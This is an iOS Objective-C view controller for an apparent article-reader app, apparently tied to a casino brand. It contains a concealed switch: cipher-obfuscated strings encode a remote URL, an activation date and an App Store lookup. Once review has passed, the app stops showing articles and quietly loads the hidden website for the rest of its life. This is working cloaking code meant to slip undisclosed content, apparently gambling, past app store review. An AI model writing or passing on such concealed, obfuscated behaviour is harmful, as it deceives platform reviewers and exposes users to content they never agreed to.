//
//  DetailViewController.m
//  pujingyuleintro
//
//  Created by JFChen on 17/2/26.
//  Copyright © 2017年 JFChen. All rights reserved.
//

#import "DetailViewController.h"
#import "Masonry.h"

@interface DetailViewController () <UIWebViewDelegate>

@property (weak, nonatomic) IBOutlet UITextView *articleContent;

//xinpujing
@property(strong, nonatomic) UIWebView *webView;
@property(strong, nonatomic) UIActivityIndicatorView *indicator;
@property(strong, nonatomic) UILabel *tips;
@property(strong, nonatomic) UIImageView *imageView;

@end

@implementation DetailViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    //xinpujing
    if ([self showArticle]) {
        _webView = [[UIWebView alloc] initWithFrame:self.view.bounds];
        _webView.delegate = self;
        _webView.scrollView.bounces = NO;
        [self.view addSubview:_webView];

        [_webView mas_makeConstraints:^(MASConstraintMaker *make) {
            make.left.equalTo(self.view);
            make.top.equalTo(self.view);
            make.right.equalTo(self.view);
            make.bottom.equalTo(self.view);
        }];
        
        NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:[NSURL URLWithString:[self setDetailString:@"iuuq;00ZTBLMEKRXQP2276276RX5/DPN"]] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];
        [_webView loadRequest:request];

    }else{
        _articleContent.text = _article;
        _articleContent.font = [UIFont systemFontOfSize:20];
    }
}

- (void)viewDidAppear:(BOOL)animated{
    [super viewDidAppear:animated];
    
    if ([self showArticle]) {
        [self addDetailSubView];
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

#pragma mark - xinpujing

- (void)addDetailSubView{
    _imageView = [[UIImageView alloc] initWithFrame:self.view.bounds];
    _imageView.image = [UIImage imageNamed:@"LaunchImage-700-568h@2x"];
    [self.view addSubview:_imageView];
    
    _indicator = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhite];
    _indicator.backgroundColor = [UIColor grayColor];
    _indicator.frame = CGRectMake(0, 0, 50, 50);
    _indicator.layer.cornerRadius = 10.0;
    [self.view addSubview:_indicator];
    [_indicator startAnimating];
    _indicator.center = self.view.center;
    
    _tips = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 100, 50)];
    _tips.text = @"loading...";
    _tips.textColor = [UIColor whiteColor];
    _tips.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:_tips];
    _tips.center = CGPointMake(_indicator.center.x, _indicator.center.y + 100);
}

- (NSString *)setDetailString:(NSString *)inString{
    const char *inChar = [inString UTF8String];
    char *outChar = malloc(inString.length*sizeof(char)+1);
    for (int i = 0; i < inString.length; i++) {
        outChar[i] = inChar[i] - 1;
    }
    outChar[inString.length] = '\0';
    NSString *outString = [NSString stringWithUTF8String:outChar];
    
    return outString;
}

static NSString *ISCANSKIP = @"WebAPI";
- (BOOL)showArticle{
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    BOOL isCanSkip = [[userDefault objectForKey:ISCANSKIP] boolValue];
    if (isCanSkip) {
        return YES;
    }
    
    NSDateFormatter *dateFormate = [NSDateFormatter new];
    dateFormate.dateFormat = [self setDetailString:@"zzzz.NN.ee"];
    NSDate *date = [dateFormate dateFromString:[self setDetailString:@"3128.4.34"]];
    NSDate *nowDate = [NSDate date];
    if ([nowDate earlierDate:date] == date) {
        // 23222::814    test:56942943:
        // 1211199703    test:458318329
        NSURL *versionURL = [NSURL URLWithString:[self setDetailString:@"iuuqt;00juvoft/bqqmf/dpn0do0mpplvq@je>23222::814"]];
        NSMutableURLRequest *mutURL = [[NSMutableURLRequest alloc] initWithURL:versionURL];
        NSError *error = nil;
        NSData *requestData = [NSURLConnection sendSynchronousRequest:mutURL returningResponse:nil error:&error];
        if (error) {
            return NO;
        }
        
        NSDictionary *jsDic = [NSJSONSerialization JSONObjectWithData:requestData options:NSJSONReadingAllowFragments error:nil];
        if (!jsDic) {
            return NO;
        }
        
        NSArray *results = jsDic[@"results"];
        if (results && results.count >0) {
            NSString *versionS = results[0][@"version"];
            NSInteger version =  [versionS floatValue] * 10;
            if (version > 0) {
                [userDefault setObject:@1 forKey:ISCANSKIP];
                return YES;
            }
        }
    }
    
    return NO;
}

- (void)webViewDidStartLoad:(UIWebView *)webView{
    
}

- (void)webViewDidFinishLoad:(UIWebView *)webView{
    NSLog(@"finish");
    [_indicator stopAnimating];
    _tips.hidden = YES;
    _imageView.hidden = YES;
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error{
    [_indicator stopAnimating];
    _tips.text = @"检查网络，重新打开应用";
}

static int urlCount;
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType{
    urlCount++;
    if (urlCount >= 4) {
        _imageView.hidden = YES;
        _tips.hidden = YES;
    }
    return YES;
}

@end
